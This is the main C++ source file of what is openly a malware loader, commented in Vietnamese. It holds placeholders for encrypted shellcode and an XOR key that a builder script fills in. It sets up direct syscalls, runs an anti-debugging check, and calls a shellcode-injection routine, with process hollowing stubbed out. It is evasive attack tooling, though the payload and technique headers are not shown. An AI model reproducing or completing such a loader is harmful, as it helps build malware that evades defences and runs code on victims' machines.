// src/main.cpp

// Include các tiện ích cốt lõi
#include "core/utils.h"

// Include file tổng hợp các kỹ thuật (Recipes)
// File này sẽ tự động include các file con như alloc_local.h, exec_thread.h...
#include "techniques/recipes.h"

// Include các file Storage/Transformation riêng lẻ nếu cần truy cập trực tiếp struct/hàm
// (Hoặc tốt nhất là recipes.h nên include chúng luôn)
#include "techniques/1_storage/storage_data.h"
#include "techniques/3_transformation/crypto_xor.h" 
#include "techniques/0_anti_analysis/anti_debug.h" 

// --- Dữ liệu do Builder.py sinh ra ---

// 1. Payload (Ciphertext)
unsigned char shellcode[] = /*{{SHELLCODE}}*/;
unsigned int shellcode_len = /*{{SHELLCODE_LEN}}*/;

// 2. Key (Byte Array)
unsigned char key[] = /*{{KEY}}*/;
unsigned int key_len = /*{{KEY_LEN}}*/;

// 3. AES Nonce (Placeholder cho tương lai)
// unsigned char nonce[] = /*{{NONCE}}*/;
// unsigned int nonce_len = /*{{NONCE_LEN}}*/;

PVOID g_syscall_addr = NULL;
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtCreateThreadEx = 0;
DWORD g_ssn_NtWaitForSingleObject = 0;

// --- Entry Point ---
extern "C" int main() {
    
    DEBUG_MSG("Start", "Hello from malware");

    // --- Initialze ---
    #ifdef USE_DIRECT_SYSCALLS
        DEBUG_MSG("Initialze", "Initialze syscall...");
        if (!InitializeSyscalls()) {
            // Có thể thêm một hành động thoát im lặng ở đây
            return 1; 
        }
    #endif

    // Stage 0: Anti-Analysis (Global Check)
    #ifdef EVASION_CHECKS_ENABLED
        if (IsDebugged()) return;
    #endif

    // Chọn Recipe dựa trên cờ biên dịch
    #ifdef INJECTION_CLASSIC
        Recipe_Classic_Injection();
    #elif defined(INJECTION_HOLLOWING)
        // Recipe_Process_Hollowing();
    #endif

    return 0;
}